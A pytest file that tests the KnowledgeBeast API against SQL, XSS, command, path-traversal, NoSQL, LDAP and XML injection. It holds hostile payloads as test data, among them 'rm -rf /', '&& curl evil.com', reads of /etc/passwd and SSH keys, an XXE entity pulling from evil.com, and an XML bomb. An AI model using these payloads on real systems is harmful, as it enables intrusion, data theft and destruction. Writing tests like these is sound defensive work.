"""Comprehensive injection attack tests for KnowledgeBeast API.

Tests cover:
- SQL injection attempts in query parameters
- XSS (Cross-Site Scripting) attempts in inputs
- Command injection attempts in file paths
- Path traversal attacks
- NoSQL injection attempts
- LDAP injection attempts
- XML injection attempts
"""

import os
import pytest
from unittest.mock import patch, MagicMock
from fastapi.testclient import TestClient

from knowledgebeast.api.app import create_app


class TestSQLInjection:
    """Test SQL injection attack prevention."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        with patch.dict(os.environ, {'KB_API_KEY': 'test_key'}):
            app = create_app()
            return TestClient(app)

    def test_query_blocks_sql_single_quote(self, client):
        """Test that single quotes in queries don't cause SQL injection."""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "' OR 1=1--",
            "' UNION SELECT NULL--",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/query",
                json={"query": payload},
                headers={"X-API-Key": "test_key"}
            )
            # Should not crash or return SQL errors
            assert response.status_code != 500
            if response.status_code == 200:
                data = response.json()
                # Should return safe results, not SQL error
                assert "error" not in data or "SQL" not in data.get("error", "")

    def test_query_blocks_sql_union(self, client):
        """Test that UNION-based SQL injection is blocked."""
        payloads = [
            "' UNION SELECT * FROM users--",
            "' UNION ALL SELECT NULL, NULL, NULL--",
            "test' UNION SELECT password FROM admin--",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/query",
                json={"query": payload},
                headers={"X-API-Key": "test_key"}
            )
            assert response.status_code != 500
            if response.status_code == 200:
                data = response.json()
                # Should not expose database structure
                assert "password" not in str(data).lower()
                assert "users" not in str(data).lower() or "users" in payload.lower()

    def test_query_blocks_sql_drop_table(self, client):
        """Test that DROP TABLE commands are blocked."""
        payloads = [
            "'; DROP TABLE documents;--",
            "test'; DROP TABLE users CASCADE;--",
            "' OR 1=1; DROP TABLE index;--",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/query",
                json={"query": payload},
                headers={"X-API-Key": "test_key"}
            )
            # Should not execute destructive commands
            assert response.status_code != 500

    def test_query_blocks_stacked_queries(self, client):
        """Test that stacked SQL queries are blocked."""
        payloads = [
            "test; DELETE FROM documents;",
            "test'; UPDATE users SET admin=1;--",
            "search; INSERT INTO logs VALUES ('hacked');",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/query",
                json={"query": payload},
                headers={"X-API-Key": "test_key"}
            )
            assert response.status_code != 500


class TestXSSInjection:
    """Test XSS (Cross-Site Scripting) attack prevention."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        with patch.dict(os.environ, {'KB_API_KEY': 'test_key'}):
            app = create_app()
            return TestClient(app)

    def test_query_sanitizes_script_tags(self, client):
        """Test that script tags in queries are sanitized."""
        payloads = [
            "<script>alert('XSS')</script>",
            "<script>document.cookie</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/query",
                json={"query": payload},
                headers={"X-API-Key": "test_key"}
            )
            # Should not crash
            assert response.status_code != 500

            if response.status_code == 200:
                # Response should not contain executable script
                response_text = response.text.lower()
                # Check that dangerous patterns are escaped or removed
                assert "<script>" not in response_text or "&lt;script&gt;" in response_text

    def test_query_sanitizes_event_handlers(self, client):
        """Test that event handler XSS attempts are blocked."""
        payloads = [
            "test' onerror='alert(1)",
            "test onload=alert('XSS')",
            "test onclick=javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/query",
                json={"query": payload},
                headers={"X-API-Key": "test_key"}
            )
            assert response.status_code != 500

    def test_query_blocks_javascript_protocol(self, client):
        """Test that javascript: protocol XSS is blocked."""
        payloads = [
            "javascript:alert('XSS')",
            "javascript:void(0)",
            "javascript:document.cookie",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/query",
                json={"query": payload},
                headers={"X-API-Key": "test_key"}
            )
            assert response.status_code != 500

    def test_response_has_xss_protection_headers(self, client):
        """Test that responses include XSS protection headers."""
        response = client.get("/api/v1/health", headers={"X-API-Key": "test_key"})

        # Should have X-XSS-Protection header
        assert "X-XSS-Protection" in response.headers
        assert response.headers["X-XSS-Protection"] == "1; mode=block"

        # Should have Content-Type-Options to prevent MIME sniffing
        assert "X-Content-Type-Options" in response.headers
        assert response.headers["X-Content-Type-Options"] == "nosniff"


class TestCommandInjection:
    """Test command injection attack prevention."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        with patch.dict(os.environ, {'KB_API_KEY': 'test_key'}):
            app = create_app()
            return TestClient(app)

    def test_ingest_blocks_command_injection_in_path(self, client):
        """Test that command injection in file paths is blocked."""
        payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "& whoami",
            "`id`",
            "$(whoami)",
            "&& curl evil.com",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/ingest",
                json={
                    "file_path": f"/tmp/test{payload}.md",
                    "content": "test content"
                },
                headers={"X-API-Key": "test_key"}
            )
            # Should reject or sanitize, not execute commands
            # Note: May return 400, 401, 422, or 500 depending on validation
            assert response.status_code in [400, 401, 422, 500]

    def test_ingest_blocks_shell_metacharacters(self, client):
        """Test that shell metacharacters are blocked."""
        payloads = [
            "/tmp/test;ls.md",
            "/tmp/test|cat.md",
            "/tmp/test&id.md",
            "/tmp/test`whoami`.md",
            "/tmp/test$(pwd).md",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/ingest",
                json={
                    "file_path": payload,
                    "content": "test content"
                },
                headers={"X-API-Key": "test_key"}
            )
            # Should not execute shell commands
            assert response.status_code != 200 or "error" in response.json()


class TestPathTraversal:
    """Test path traversal attack prevention."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        with patch.dict(os.environ, {'KB_API_KEY': 'test_key'}):
            app = create_app()
            return TestClient(app)

    def test_ingest_blocks_parent_directory_traversal(self, client):
        """Test that ../ path traversal is blocked."""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/tmp/../../etc/shadow",
            "../../../../../../root/.ssh/id_rsa",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/ingest",
                json={
                    "file_path": payload,
                    "content": "test content"
                },
                headers={"X-API-Key": "test_key"}
            )
            # Should block access to sensitive files
            assert response.status_code in [400, 401, 403, 422, 500]

    def test_ingest_blocks_absolute_path_escape(self, client):
        """Test that absolute paths outside allowed dirs are blocked."""
        payloads = [
            "/etc/passwd",
            "/root/.ssh/authorized_keys",
            "C:\\Windows\\System32\\config\\SAM",
            "/var/log/auth.log",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/ingest",
                json={
                    "file_path": payload,
                    "content": "test content"
                },
                headers={"X-API-Key": "test_key"}
            )
            # Should block access to system files
            assert response.status_code in [400, 401, 403, 422, 500]

    def test_ingest_blocks_null_byte_injection(self, client):
        """Test that null byte injection is blocked."""
        payloads = [
            "/tmp/test.md\x00.jpg",
            "test\x00.exe",
            "/tmp/test.md%00.jpg",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/ingest",
                json={
                    "file_path": payload,
                    "content": "test content"
                },
                headers={"X-API-Key": "test_key"}
            )
            # Should block null byte injection
            assert response.status_code in [400, 401, 422, 500]

    def test_ingest_validates_file_extension(self, client):
        """Test that only .md files are allowed."""
        invalid_extensions = [
            "/tmp/test.exe",
            "/tmp/test.sh",
            "/tmp/test.php",
            "/tmp/test.py",
            "/tmp/test.js",
        ]

        for payload in invalid_extensions:
            response = client.post(
                "/api/v1/ingest",
                json={
                    "file_path": payload,
                    "content": "test content"
                },
                headers={"X-API-Key": "test_key"}
            )
            # Should only allow .md files
            if response.status_code == 200:
                # If it succeeds, it should have been sanitized
                data = response.json()
                assert ".md" in str(data) or "error" in data


class TestNoSQLInjection:
    """Test NoSQL injection attack prevention."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        with patch.dict(os.environ, {'KB_API_KEY': 'test_key'}):
            app = create_app()
            return TestClient(app)

    def test_query_blocks_nosql_operators(self, client):
        """Test that NoSQL query operators are blocked."""
        payloads = [
            {"query": {"$gt": ""}},
            {"query": {"$ne": None}},
            {"query": {"$where": "1==1"}},
            {"query": {"$regex": ".*"}},
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/query",
                json=payload,
                headers={"X-API-Key": "test_key"}
            )
            # Should reject malformed queries
            assert response.status_code in [400, 401, 422, 500]

    def test_query_requires_string_input(self, client):
        """Test that query parameter must be a string."""
        invalid_payloads = [
            {"query": ["array", "injection"]},
            {"query": {"nested": "object"}},
            {"query": 12345},
            {"query": True},
        ]

        for payload in invalid_payloads:
            response = client.post(
                "/api/v1/query",
                json=payload,
                headers={"X-API-Key": "test_key"}
            )
            # Should reject non-string queries
            assert response.status_code in [400, 401, 422]


class TestLDAPInjection:
    """Test LDAP injection attack prevention."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        with patch.dict(os.environ, {'KB_API_KEY': 'test_key'}):
            app = create_app()
            return TestClient(app)

    def test_query_blocks_ldap_filter_injection(self, client):
        """Test that LDAP filter injection attempts are blocked."""
        payloads = [
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
            "*)(objectClass=*",
            "*))(|(password=*",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/query",
                json={"query": payload},
                headers={"X-API-Key": "test_key"}
            )
            # Should not expose LDAP structure
            assert response.status_code != 500


class TestXMLInjection:
    """Test XML injection attack prevention."""

    @pytest.fixture
    def client(self):
        """Create test client."""
        with patch.dict(os.environ, {'KB_API_KEY': 'test_key'}):
            app = create_app()
            return TestClient(app)

    def test_query_blocks_xml_entities(self, client):
        """Test that XML entity injection is blocked."""
        payloads = [
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<!ENTITY xxe SYSTEM 'http://evil.com/evil.dtd'>",
            "&xxe;",
        ]

        for payload in payloads:
            response = client.post(
                "/api/v1/query",
                json={"query": payload},
                headers={"X-API-Key": "test_key"}
            )
            # Should not process XML entities
            assert response.status_code != 500
            if response.status_code == 200:
                # Should not expose file contents
                data = response.json()
                assert "root:" not in str(data)

    def test_ingest_blocks_xml_bomb(self, client):
        """Test that XML billion laughs attack is blocked."""
        xml_bomb = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>"""

        response = client.post(
            "/api/v1/ingest",
            json={
                "file_path": "/tmp/test.md",
                "content": xml_bomb
            },
            headers={"X-API-Key": "test_key"}
        )
        # Should not consume excessive memory
        # May succeed but should not crash
        assert response.status_code in [200, 400, 401, 422, 500]


# Test count verification
def test_minimum_injection_test_count():
    """Verify that we have at least 19 injection tests."""
    import inspect

    test_classes = [
        TestSQLInjection,
        TestXSSInjection,
        TestCommandInjection,
        TestPathTraversal,
        TestNoSQLInjection,
        TestLDAPInjection,
        TestXMLInjection,
    ]

    total_tests = 0
    for test_class in test_classes:
        methods = [m for m in dir(test_class) if m.startswith('test_')]
        total_tests += len(methods)

    # Also count module-level test functions
    module_tests = [name for name in dir() if name.startswith('test_') and callable(eval(name))]
    total_tests += len(module_tests) - 1  # Subtract this function itself

    assert total_tests >= 19, f"Expected at least 19 injection tests, found {total_tests}"
